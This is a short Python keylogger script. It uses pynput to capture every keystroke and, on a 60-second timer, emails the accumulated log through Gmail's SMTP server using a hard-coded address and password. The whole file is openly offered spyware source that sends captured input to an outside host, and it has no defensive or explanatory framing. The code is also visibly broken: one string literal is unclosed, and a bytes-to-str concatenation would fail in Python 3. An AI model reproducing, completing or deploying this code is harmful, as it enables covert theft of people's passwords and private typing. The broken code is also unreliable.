import pynput.keyboard
import smtplib
import threading

log = "" #global
def callback(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log =log +str(key)
    print(log)


def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


def thread_function():
    global log
    send_email("kylogtest@gmail.com", "testkylog123, log)
    log = ""
    timer_object = threading.Timer(60,thread_function)
    timer_object.start()

listener = pynput.keyboard.Listener(on_press=callback)
with listener:
    thread_function()
    listener.join()
